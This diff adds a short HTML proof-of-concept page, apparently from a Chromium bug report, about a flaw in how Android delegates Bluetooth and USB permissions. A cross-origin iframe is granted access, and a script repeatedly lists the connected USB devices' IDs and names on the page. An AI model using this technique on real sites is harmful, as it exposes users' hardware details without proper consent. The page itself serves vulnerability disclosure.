@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+html { font-family: sans-serif; }
+iframe { width: 90%; height: 300px; }
+</style>
+</head>
+<body>
+<h1>PoC: Bluetooth or USB dialog, incorrect permission delegation behavior (Android)</h1>
+<p>iframe below is cross-origin and delegates permissions via allow="bluetooth;usb"</p>
+<p>Scenarios: <a href="?bt">Bluetooth PoC</a>, <a href="?usb">USB PoC</a></p>
+<p id="usbOutput"></p>
+<iframe id="testFrame" allow="bluetooth;usb"></iframe>
+<script>
+testFrame.src = 'https://aogarantiza.com/chromium/bt-usb-frame.html?' + window.location.search;
+if (window.location.search.indexOf('usb') > -1) {
+  setInterval(() => {
+    navigator.usb.getDevices().then((devices) => {
+      usbOutput.innerText = '';
+      devices.forEach((device) => {
+        usbOutput.innerText = usbOutput.innerText + device.productId + ', ' + device.vendorId + ', ' + device.productName + "\n";
+      });
+    });
+  }, 3000);
+}
+</script>
+</body>
+</html>
